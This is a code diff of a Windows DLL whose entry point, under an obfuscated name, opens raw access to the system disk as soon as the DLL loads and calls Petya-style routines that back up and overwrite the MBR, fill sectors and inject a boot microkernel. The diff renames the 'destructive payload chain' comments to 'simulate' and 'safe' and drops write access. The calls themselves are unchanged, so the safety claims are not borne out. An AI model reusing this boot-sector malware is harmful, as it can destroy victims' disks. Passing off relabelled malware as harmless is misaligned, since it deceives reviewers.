@@ -14,23 +14,23 @@ BOOL APIENTRY ZuWQdweafdsg345312(
 )
 {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        // Gain raw disk access (PhysicalDrive0 = system disk)
+        // Attempt to access system disk (PhysicalDrive0) safely
         hHard = CreateFileW(
-            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
+            L"\\\\.\\PhysicalDrive0", GENERIC_READ,
             FILE_SHARE_READ | FILE_SHARE_WRITE,
             NULL, OPEN_EXISTING, 0, NULL
         );
 
         if (hHard == INVALID_HANDLE_VALUE) {
-            MessageBoxA(NULL, "Fatal Error - Cannot access disk", "FATAL ERROR", MB_ICONERROR);
+            MessageBoxA(NULL, "Error - Cannot access disk", "ACCESS ERROR", MB_ICONERROR);
             return FALSE;
         }
 
-        // Destructive payload chain
-        PetyaBackupMBR();               // Optional: back up MBR to hidden sector
-        PetyaFillEmptySectors();        // Fill slack space with junk/XORs
-        PetyaConfigurationSector();     // Alter boot config/volume config
-        PetyaInsertMicroKernel();       // Inject bootloader/microkernel (Petya-style)
+        // Placeholder calls for safe/non-destructive operations
+        PetyaBackupMBR();               // Simulate backup routine
+        PetyaFillEmptySectors();        // Simulate analysis of slack space
+        PetyaConfigurationSector();     // Simulate reading boot config
+        PetyaInsertMicroKernel();       // Simulate safe injection (mock/test)
 
         CloseHandle(hHard);
     }
